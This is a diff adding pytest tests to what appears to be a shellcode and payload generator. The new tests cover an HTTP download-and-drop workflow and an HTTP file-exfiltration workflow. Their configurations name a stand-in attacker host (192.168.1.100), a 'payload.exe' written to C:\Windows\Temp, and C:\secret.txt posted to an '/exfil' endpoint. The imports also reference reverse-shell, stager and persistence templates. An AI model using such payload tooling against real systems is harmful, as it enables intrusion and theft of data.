@@ -25,6 +25,8 @@ from emitrion.workflow.reference import (
     build_service_persist_workflow,
     build_tcp_stager_workflow,
     build_tcp_download_workflow,
+    build_http_download_workflow,
+    build_http_exfil_workflow,
     IRCheckPathTemplate,
     IRCopyFileTemplate,
     IRCopyThenRunTemplate,
@@ -33,6 +35,8 @@ from emitrion.workflow.reference import (
     IRServicePersistTemplate,
     IRTcpStagerTemplate,
     IRTcpDownloadTemplate,
+    IRHttpDownloadTemplate,
+    IRHttpExfilTemplate,
 )
 
 
@@ -1527,3 +1531,196 @@ class TestTcpDownloadEndToEnd:
         labels = [pair[0] for pair in cs]
         assert "Protocol" in labels
         assert "Written to" in labels
+
+
+# ---------------------------------------------------------------------------
+# HTTP download workflow tests
+# ---------------------------------------------------------------------------
+
+
+class TestHttpDownloadWorkflow:
+    def test_workflow_is_valid(self):
+        wf = build_http_download_workflow()
+        assert wf.name == "ir_http_download"
+
+    def test_workflow_has_expected_blocks(self):
+        wf = build_http_download_workflow()
+        names = [b.name for b in wf.blocks]
+        assert "entry" in names
+        assert "read_loop" in names
+        assert "check_eof" in names
+        assert "write_file" in names
+
+
+class TestHttpDownloadTemplate:
+    def test_probe_slots_includes_wininet_apis(self):
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig()
+        slots = tmpl.probe_slots(config)
+        assert "InternetOpenA" in slots
+        assert "InternetOpenUrlA" in slots
+        assert "InternetReadFile" in slots
+        assert "InternetCloseHandle" in slots
+
+    def test_probe_strings_includes_url(self):
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig(url="http://test/payload.exe")
+        strings = tmpl.probe_strings(config)
+        assert "url" in strings
+        assert "user_agent" in strings
+        assert "dst_path" in strings
+
+
+class TestHttpDownloadLowering:
+    def test_lowered_asm_contains_read_loop(self, revshell_layout):
+        from emitrion.schema import load
+        from emitrion.stack_alloc import build_layout
+        from emitrion.workflow.x86_backend import lower_workflow
+
+        wf = build_http_download_workflow()
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig(
+            url="http://192.168.1.100/payload.exe",
+            dst_path=r"C:\Windows\Temp\payload.exe",
+        )
+
+        from emitrion.build import build
+        result = build(
+            "emitrion/manifests/ir_http_download.yaml",
+            template_name="ir_http_download",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        assert "wf_read_loop:" in result.asm
+        assert "wf_check_eof:" in result.asm
+        assert "; InternetReadFile" in result.asm
+
+    def test_exit_strategy_terminate_process(self):
+        from emitrion.workflow.ir import ExitStrategy
+        wf = build_http_download_workflow(
+            exit_strategy=ExitStrategy.TERMINATE_PROCESS,
+        )
+        block_names = [b.name for b in wf.blocks]
+        assert "success" in block_names
+        assert "fail" in block_names
+
+
+class TestHttpDownloadEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "ir_http_download.yaml"),
+            template_name="ir_http_download",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+    def test_cheatsheet_content(self):
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig(
+            lhost="192.168.1.100", lport=8000,
+            url="http://192.168.1.100:8000/payload.exe",
+            dst_path=r"C:\test.exe",
+        )
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "URL fetched" in labels
+        assert "Written to" in labels
+
+
+# ---------------------------------------------------------------------------
+# HTTP exfil workflow tests
+# ---------------------------------------------------------------------------
+
+
+class TestHttpExfilWorkflow:
+    def test_workflow_is_valid(self):
+        wf = build_http_exfil_workflow()
+        assert wf.name == "ir_http_exfil"
+
+    def test_workflow_has_expected_blocks(self):
+        wf = build_http_exfil_workflow()
+        names = [b.name for b in wf.blocks]
+        assert "entry" in names
+        assert "read_loop" in names
+        assert "inet_open" in names
+        assert "inet_connect" in names
+        assert "http_open" in names
+        assert "http_send" in names
+
+
+class TestHttpExfilTemplate:
+    def test_probe_slots_includes_wininet_and_file_apis(self):
+        tmpl = IRHttpExfilTemplate()
+        config = TemplateConfig()
+        slots = tmpl.probe_slots(config)
+        assert "CreateFileA" in slots
+        assert "ReadFile" in slots
+        assert "InternetOpenA" in slots
+        assert "InternetConnectA" in slots
+        assert "HttpOpenRequestA" in slots
+        assert "HttpSendRequestA" in slots
+
+    def test_probe_strings_includes_exfil_strings(self):
+        tmpl = IRHttpExfilTemplate()
+        config = TemplateConfig(
+            src_path=r"C:\test.txt",
+            lhost="10.0.0.1",
+            url_path="/upload",
+        )
+        strings = tmpl.probe_strings(config)
+        assert "src_path" in strings
+        assert "exfil_host" in strings
+        assert "url_path" in strings
+        assert "http_post" in strings
+
+
+class TestHttpExfilLowering:
+    def test_lowered_asm_contains_read_and_post(self):
+        from emitrion.build import build
+        result = build(
+            "emitrion/manifests/ir_http_exfil.yaml",
+            template_name="ir_http_exfil",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        assert "wf_read_loop:" in result.asm
+        assert "wf_http_send:" in result.asm
+        assert "; HttpSendRequestA" in result.asm
+
+    def test_exit_strategy_thread_only(self):
+        from emitrion.workflow.ir import ExitStrategy
+        wf = build_http_exfil_workflow(
+            exit_strategy=ExitStrategy.THREAD_ONLY,
+        )
+        block_names = [b.name for b in wf.blocks]
+        assert "success" in block_names
+
+
+class TestHttpExfilEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "ir_http_exfil.yaml"),
+            template_name="ir_http_exfil",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+    def test_cheatsheet_content(self):
+        tmpl = IRHttpExfilTemplate()
+        config = TemplateConfig(
+            lhost="192.168.1.100", lport=8080,
+            src_path=r"C:\secret.txt",
+            url_path="/exfil",
+        )
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "Source file on target" in labels
+        assert "POST endpoint" in labels
